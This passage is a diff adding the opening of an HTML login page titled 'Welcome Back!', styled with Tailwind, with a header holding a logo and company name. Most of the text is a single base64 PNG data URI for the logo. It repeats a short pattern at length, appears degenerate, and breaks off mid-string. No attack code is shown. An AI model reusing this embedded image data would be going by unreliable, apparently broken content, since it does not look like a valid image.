@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome Back!</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Work+Sans:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            font-family: 'Work Sans', sans-serif;
+            font-optical-sizing: auto;
+        }
+    </style>
+</head>
+<body>
+    <div id="root">
+        <div class="w-screen min-h-screen bg-blue-900 flex flex-col items-center justify-center p-4 overflow-y-auto">
+            <!-- Step 1: Login -->
+            <div id="step-1" class="bg-white rounded-lg shadow-xl w-full max-w-md p-6 sm:p-8">
+                <!-- Header with logo and company name -->
+                <div class="flex items-center mb-4 sm:mb-6">
+                    <svg class="h-8 w-auto sm:h-10" viewBox="0 0 1000 300">
+                        <image href="data:image/png;base64,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T5+uZGH23bt3nyZk+/bta/bpp58OeO+993592223KVnLOuj1SW/PdWa9rYm2rJf+2GOPqVWrVr21Y8eOi5VSDWTlmc8+++x8GbGRi8Scd9551ji79dq8efM6iXYpztGeOHGidXXj1pFuou0+34bb6667Ti1ZsuS3kkTJf/nyJm27cePG1jqXl5crWR7PLbPcSn/eqVMna8qcKzFM4/J+4mwqZtM0R7tPnz6qoqJinxufK1asWPzoo4+qk046yZr4zKzHU045RY0fP772uOiWe86cOfudq0JbUe65c+f+w8JUkiJlE+jRo4fx4JERdUmgv/zyy7bZyup9TNb8tiHhznVZVNsS7c6dOyvp8LyW2e7LUlbnn3++8RjxdoiZSysqpZq4nWLQrXyp8L5HUvdlelFQmbJtl33KVi/V1dUdsr1eHnPWXE18v9OUaI8ePVplG3WVL5+2famRBCbXL2nyeLt27RKv+8x2RaId7whsGhLtu+66S23fvr17tv5r9uzZB5s2bWo8Pt14lS+nQataufuxdevW/hdddJHxMpNouzWSklul1FFuoJm6bdWqlXIuABBaTUa6f/SjHxkPfBltDyq8TYm2c4Z/UFGzbp86dapxZzdGFyxY8KeshfV50OmcEt+HU089VT7TyL977rkn8f2VOkpDoi0jV1u2bBmsWzGzZs065MafydsXX3xRO56++eab4531543EgTgVY6ItvwKaigGbE225gq8zjU+rWZk8qdRbfzfddJN2m5IdM/1LL4m2VnjZ86SlS5eu9gZc0vd79eqlJFnOV8S5aqCxg8m0adMCG6oNibaM/DudWl7UsqyVM4JvzFpi9OGHHw70DtpBEu14R9ay9RW2J9odO3bUWpozM5Yuv/xyo3Ef5QDrnDhlrNwk2vG2O1sTbZnSV1VVdX9mm8n190MPPWQsNqUPGzFiROhjiYxsZ+v/Cv1YlH4gVz3weAEFxowZYyzI5WDnjKjHsocmE9rrr78+sLGaLJfb4HP9zBymAmwYhejbt2+gd9C+kGjHe8B3Y8vv1vZEO9dPxEExZPLS2zJdJKhcubZ36dLFWD9fjIm2M/XOiKmtibazrn+uUKzzuDPQZsTSmStep0w6G2655RYjZZb+lkRbp4Yseo6paRdyglHmPNs4WLp162Yk+M8880z5XN9/phPtfKaL+O5QWVmZqYtMuEld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texTx44dA709xTzsrqlEu23btqHLeljB8/jjnnvuMVJHJNrhDpw6yU2xXhnytddeMxKjYn7iiSdKglA/TBMbNWqUsfJKmZVSR2YrL4m2ftsrhakjNavmbYk7sfZ7vwMvXC2x2ThbbJbsY5WVlZt1OvlCPEeCPM4pJH369DHWATqXfPeNIzbLjf8AABQPSURBVNOJttRdnJdjX7ly5YJCxEOY97zmmmukrkP9M5VoN2nSJHRZQ+1YlieTaPsfdBnR9ncJ0wZ1n5trRNvUlC63/IMHD9ZunyZPgnTLm6W51z5Eoq0f28WeaNdsXLLQLyku1LYDk2/Qbku54rioHldKNfA0YEFK9H/Pnj2V81NcZNevv/76OJNJtphl+ynHhkRbToyMY13tNWvWTG/evHmiMeIXk88++2zoBm0q0Zbyb968eVjkAM/jhSTa/v0Ziba/i19by3dbrkR74cKFf8j3M/J9/aBBg3L2Jy+++KLxfu+EE07IWU4Sbf3YLuZEW1X/unehEups73uoYmzOGM3jkJbel15yySVGOxBZuWLDhg1jowjKAfOkk04yWn7p5L/88su2QeW3IdF2D0TO2fJBRc263eSZ9m753dsPP/xwcdbC+jz41ltv/d19fdK3UUbgfXYh9CYSbf+DbhoT7YEDB0Y+gDknahvpJ3OtkrFu3bpJSbdHv8+T49CECRPU+++//6vVq1fPkf9Lly5d/cILL6izzz7biF1mOS+66KKcMUCi7d/mMy3l77Qm2s6xLOvx4MDLA2M/8TFbgu19TEbSsxauFB80NU87M/Bvu+22nGdUu/UjifmVV15pRedXXl6etfOzKdEWczloONM/XM6stytXrnzHlgONGzNKqUZZC+3zoMkRbSl3586d1bx58/6mlDrKp3gF2USi7X/QTWOiXaxztJ0Rbyv6crd/sfV2+PDhWY810omQaPu3eb86TWuine0XdImBml/8x++9iW/S9/ePvzBnnBbkgGfzm37yySfX+QWhqW0//OEP1fTp05U7qrBq1aq33n333Z1y0syIESPUySefbFWnPHHixKxBZVui7darLO04fvx4JaPDrrV7K9vGjRunzjnnHKuspezO8lWhm5TpRNt1z7yVX5R69+6t5NZZ+1w5P1OH3sfMF5Bo+x90SbT9XTJjM46/c00dkZh11rS2rq+JY//jfA+dfoFEWz+2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